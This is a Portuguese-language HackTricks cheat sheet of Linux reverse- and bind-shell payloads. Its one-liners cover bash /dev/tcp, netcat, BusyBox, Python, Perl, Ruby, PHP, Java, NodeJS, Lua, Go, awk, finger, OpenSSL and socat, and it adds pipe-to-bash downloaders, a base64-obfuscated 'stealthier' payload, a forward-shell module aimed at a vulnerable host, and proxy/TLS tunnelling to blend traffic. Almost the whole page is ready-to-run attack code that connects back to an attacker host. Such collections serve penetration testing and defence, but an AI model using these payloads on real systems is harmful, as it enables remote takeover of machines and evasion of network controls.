# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**Se tiver dúvidas sobre qualquer um desses shells, você pode verificá-los em** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>

## Full TTY

**Depois de obter um reverse shell,**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**

Os payloads de reverse shell básicos reunidos abaixo também estão documentados nas cheat sheets do HighOn.Coffee e do PayloadsAllTheThings; verifique se o interpretador e os utilitários estão disponíveis no alvo antes de selecionar um.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

Não se esqueça de verificar também outros shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash.

### Shell com símbolos seguros

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Explicação do shell

Os pontos a seguir resumem o comportamento documentado do Bash em modo interativo e de redirecionamento:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Esta parte do comando inicia um shell Bash interativo (`-i`).
2. **`>&`**: Esta parte do comando é uma notação abreviada para **redirecionar a saída padrão** (`stdout`) e o **erro padrão** (`stderr`) para o **mesmo destino**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Este é um arquivo especial que **representa uma conexão TCP com o endereço IP e a porta especificados**.
   - Ao **redirecionar os fluxos de saída e erro para este arquivo**, o comando efetivamente envia a saída da sessão de shell interativa para a máquina do atacante.
4. **`0>&1`**: Esta parte do comando **redireciona a entrada padrão (`stdin`) para o mesmo destino da saída padrão (`stdout`)**.

### Criar em um arquivo e executar

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

Quando há RCE disponível, mas um reverse shell é bloqueado por um firewall, NAT ou filtragem de saída, um forward shell pelo canal de RCE pode fornecer uma sessão semi-interativa.<sup>[[12]](#references)</sup>

Uma ferramenta recomendada para esse fim é [toboggan](https://github.com/n3rada/toboggan.git), que encapsula uma primitiva de execução de comandos em uma sessão interativa.<sup>[[12]](#references)</sup>

Para usar o toboggan, crie um módulo Python adaptado ao contexto de RCE do sistema-alvo; a interface do módulo espera uma função `execute(command, timeout)` que retorna a saída do comando.<sup>[[12]](#references)</sup> Por exemplo, um módulo chamado `nix.py` poderia ser estruturado da seguinte forma:

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

Execute o módulo usando a sintaxe atual de linha de comando do toboggan:<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

Isso inicia a sessão interativa. Para o backend integrado do Burp Suite, use `toboggan --request burp_request.xml`; para um backend de wrapper de comandos, use `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>

Outra possibilidade é a implementação de forward-shell do `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Você precisa modificar as seguintes partes:<sup>[[13]](#references)</sup>

- A URL do host vulnerável
- O prefixo e o sufixo do seu payload (se houver)
- A forma como o payload é enviado (cabeçalhos? dados? informações extras?)

Em seguida, você pode **enviar comandos** ou usar o **comando `upgrade`** para obter um PTY completo; a implementação consulta a saída em intervalos aproximados de 1,3 segundo.<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

O BusyBox combina muitos utilitários em um único executável pequeno e é comum em sistemas Linux pequenos ou embarcados. Se não houver um `nc` independente, verifique se o BusyBox disponibiliza essa ferramenta:<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

Se `busybox nc` estiver disponível, mas a execução interativa for instável, adapte o padrão FIFO da seção `nc` a esse applet:<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

Consulte as instruções oficiais de implantação em [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**Atacante**

```bash
while true; do nc -l <port>; done
```

Use a mesma sequência de entrada Enter/CTRL+D descrita na seção Whois.<sup>[[3]](#references)</sup>

**Vítima**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### Através de um proxy de saída explícito

Se o alvo puder acessar um proxy HTTP `CONNECT` ou SOCKS, mas não conseguir abrir uma conexão TCP direta com o listener, use o **Ncat** no modo connect. O proxy precisa permitir um túnel até o host e a porta do listener; `CONNECT` só encaminha bytes após a configuração, portanto um shell simples **não** é tráfego HTTP nem fica criptografado só por usar um proxy HTTP.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

Para um proxy autenticado, o Ncat aceita `--proxy-auth` ou `NCAT_PROXY_AUTH` (a segunda opção evita incluir credenciais nos argumentos do comando).<sup>[[23]](#references)</sup> Por padrão, o proxy resolve os nomes de host de destino; use `--proxy-dns local` somente quando a resolução local for necessária.<sup>[[23]](#references)</sup> Se o proxy exigir TLS ou protocolos de aplicação além de `CONNECT`, use um transporte criptografado apropriado, em vez de presumir que a porta 443 disfarça um shell bruto; consulte [tunneling and port forwarding](../tunneling-and-port-forwarding.md) para obter informações sobre transporte baseado em WebSocket.<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh (TCP integrado)

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno semelhante ao netcat, escrito em Rust.<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

Recursos documentados pelo projeto incluem:<sup>[[5]](#references)</sup>
- Histórico de comandos e preenchimento com Tab no modo interativo
- `-s` para selecionar o executável do shell usado por `connect`

## pwncat-cs

Se você já tiver **qualquer raw reverse shell**, mas quiser um listener que possa configurar uma sessão mais utilizável, o `pwncat-cs` pode gerenciar a conexão e tentar obter um PTY remoto.<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Também oferece suporte a canais `ssl-bind` e `ssl-connect` **criptografados**, então você pode combiná-lo com payloads `ncat --ssl` ou `socat OPENSSL:` quando precisar de criptografia de transporte.<sup>[[7]](#references)</sup>

## revsh (criptografado e pronto para pivoting)

`revsh` é um pequeno cliente/servidor em C que fornece um TTY completo por um **túnel Diffie-Hellman criptografado** e pode, opcionalmente, conectar uma interface **TUN/TAP** para pivoting reverso semelhante a VPN.<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

Flags úteis documentadas pelo `revsh` incluem:<sup>[[6]](#references)</sup>
- `-b`: modo bind-shell (ative-o nas duas extremidades)
- `-D [LHOST:]LPORT` ou `-B [RHOST:]RPORT`: encaminhamento dinâmico de SOCKS 4/4a/5
- `-x`: desativa a configuração automática de proxies, incluindo a configuração padrão de TUN/TAP

O túnel criptografado evita expor o tráfego do shell em texto simples, mas, por si só, não contorna as políticas de rede.<sup>[[6]](#references)</sup>

## OpenSSL

Esta seção usa os comandos `req`, `s_server` e `s_client` do OpenSSL para criar um certificado e transportar um shell por TLS.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

O Atacante (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

A Vítima

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

Você ainda pode usar o padrão clássico de **two-listener** quando quiser canais separados de entrada/saída.<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**Atacante**

```bash
while true; do nc -l 79; done
```

Para enviar o comando, digite-o, pressione Enter e pressione CTRL+D (para interromper STDIN).<sup>[[3]](#references)</sup>

**Vítima**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

Isso tentará se conectar ao seu sistema na porta 6001.<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

Para capturar o reverse shell, use um servidor X escutando na porta 6001, conforme mostrado abaixo.<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NOTA: Java reverse shell também funciona para Groovy.<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Guia de Reverse Shell: PHP, ASP, Netcat, Bash e Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Guia de Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Usando Whois e Finger para Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Guia de Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - O listener de portas moderno e Reverse Shell](https://github.com/robiot/rustcat)
- [6] [revsh - Uma Reverse Shell com suporte a terminal, tunelamento de dados e recursos avançados de pivoting](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - plataforma de pós-exploração](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Manual de Referência do Bash: Redirecionamentos](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Manual de Referência do Bash: Invocando o Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Instruções de implantação do Global Socket](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Reverse Shell puro em Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Proxy do Ncat](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Execução de comandos do Ncat](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Guia de referência do Ncat](https://nmap.org/book/ncat-man.html)
- [24] [README do wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
